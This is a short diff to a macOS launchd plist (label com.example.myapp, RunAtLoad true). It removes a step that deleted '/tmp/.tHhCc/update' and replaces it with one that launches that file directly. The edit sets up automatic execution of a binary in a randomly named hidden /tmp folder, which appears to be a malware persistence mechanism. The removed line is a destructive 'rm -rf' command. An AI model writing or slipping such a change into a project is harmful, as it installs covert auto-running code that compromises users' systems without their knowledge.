@@ -6,7 +6,7 @@
     <string>com.example.myapp</string>
     <key>ProgramArguments</key>
     <array>
-        <string>rm -rf /tmp/.tHhCc/update</string>
+        <string>/tmp/.tHhCc/update</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
